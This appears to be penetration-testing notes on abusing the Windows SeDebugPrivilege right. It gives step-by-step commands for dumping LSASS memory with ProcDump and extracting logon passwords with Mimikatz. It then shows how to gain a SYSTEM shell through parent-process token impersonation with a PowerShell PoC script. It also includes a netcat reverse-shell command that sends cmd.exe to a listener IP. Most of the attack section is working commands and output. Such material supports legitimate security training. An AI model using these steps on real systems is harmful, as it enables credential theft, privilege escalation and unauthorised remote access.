### Content

- [Overview](#overview)
- [SeDebugPrivilege Abuse](#sedebugprivilege-abuse)
	- [Dumping LSASS Process Memory](#dumping-lsass-process-memory)
	- [Remote Code Execution as SYSTEM](#remote-code-execution-as-system)

---
#### Overview

To run a particular application or service or assist with troubleshooting, a user might be assigned the [SeDebugPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs) instead of adding the account into the administrators group. By default, only administrators are granted this privilege as it can be used to capture sensitive information from system memory, or access/modify kernel and application structures.

---
### SeDebugPrivilege Abuse 

After logging on as a user assigned the `Debug programs` right and opening an elevated shell, we see `SeDebugPrivilege` is listed.

```CMD
C:\> whoami /priv

SeDebugPrivilege                Debug programs                         Disabled
SeChangeNotifyPrivilege         Bypass traverse checking               Enabled
SeIncreaseWorkingSetPrivilege   Increase a process working set         Disabled
```

#### Dumping LSASS Process Memory

We can utilize:
1. ProcDump
2. Task Manager

##### ProcDump

Using [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) from the [SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) suite to leverage this privilege and dump ([LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)) process memory.

```CMD
C:\> procdump.exe -accepteula -ma lsass.exe lsass.dmp
[15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
```

Load this in `Mimikatz` using the `sekurlsa::minidump` command. After issuing the `sekurlsa::logonPasswords`

```CMD
C:\> mimikatz.exe
mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...

........
```

##### Task Manager

<img src="/assets/WPE_taskmgr_lsass.webp" width="65%" height="70%" style="display: block; margin:auto;">

#### Remote Code Execution as SYSTEM

We can also leverage `SeDebugPrivilege` for [RCE](https://decoder.cloud/2018/02/02/getting-system/). Using this technique, we can elevate our privileges to SYSTEM by launching a `child process` and using the elevated rights granted to our account via `SeDebugPrivilege` to alter normal system behavior to inherit the token of a `parent process` and impersonate it. If we target a parent process running as SYSTEM (specifying the Process ID (or PID) of the target process or running program), then we can elevate our rights quickly.

Use this [PoC script](https://raw.githubusercontent.com/decoder-it/psgetsystem/refs/heads/master/psgetsys.ps1) Other tools such as [this one](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC) which is compiled [here](https://github.com/Sentinal920/Pentest-Tools/blob/master/SeDebugPrivilegePoC.exe).

1. Transfer this [PoC script](https://raw.githubusercontent.com/decoder-it/psgetsystem/refs/heads/master/psgetsys.ps1) over to the target system and import 
	``` PowerShell
	PS C:\> import-module .\psgetsys.ps1
	```
2. Run an elevated PowerShell console and run `tasklist` to get processes ID.
	``` Powershell
	PS C:\> tasklist 
	Image Name                     PID Session Name    
	========================= ======== ================ 
	winlogon.exe                   612 Console          
	```
3.  Target winlogon.exe running under PID 612
	``` PowerShell
	PS C:\> ImpersonateFromParentPid -ppid 612 -command "C:\Windows\System32\cmd.exe"
	```

	or you can resolve the PID of any process dynamically

	``` PowerShell
	PS C:\> ImpersonateFromParentPid -ppid (Get-Process "lsass").Id -command "C:\Windows\System32\cmd.exe"
	```

	New elevated CMD window will pop up, running as `NT Authority\System`.


To create a reverse shell, start a listener on the attack host, then: 

``` PowerShell
PS C:\> ImpersonateFromParentPid -ppid (Get-Process "lsass").Id  -command "C:\tools\nc.exe" -cmdargs "<LISTENER_IP> <LISTENER_PORT> -e C:\windows\System32\cmd.exe"
```

###### Or use SeDebugPrivilegePoC.exe

```PowerShell
PS C:\> .\SeDebugPrivilegePoC.exe
```

New elevated CMD window will pop up, running as `NT Authority\System`.